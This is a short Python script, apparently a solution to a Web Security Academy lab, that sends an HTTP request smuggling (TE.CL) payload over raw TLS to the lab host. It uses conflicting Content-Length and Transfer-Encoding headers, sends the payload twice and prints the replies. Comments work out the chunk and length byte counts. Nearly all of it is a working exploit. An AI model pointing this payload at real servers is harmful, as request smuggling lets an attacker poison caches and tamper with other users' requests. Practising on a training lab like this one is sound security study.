import socket
import ssl

host = '0a1d007003116eea80b3e9cb0082006d.web-security-academy.net'
port = 443

# Smuggling payload (TE.CL)
payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5e\r\n"
    "POST /404 HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 11\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)

# body1 = (
#     "POST /404 HTTP/1.1\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 10\r\n"
#     "\r\n"
#     "x=1"
# )
# print(hex(len(body1))) # 0x5e => line(15)
# Content-length: 10 => line(20-22) + 1 byte to return 404 = 11 byte
# Content-length: 4 (line(12) = 4 byte length of "5e\r\n")

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending first payload...")
send_raw_https(host, port, payload)

print("\n[+] Sending second payload...")
send_raw_https(host, port, payload)
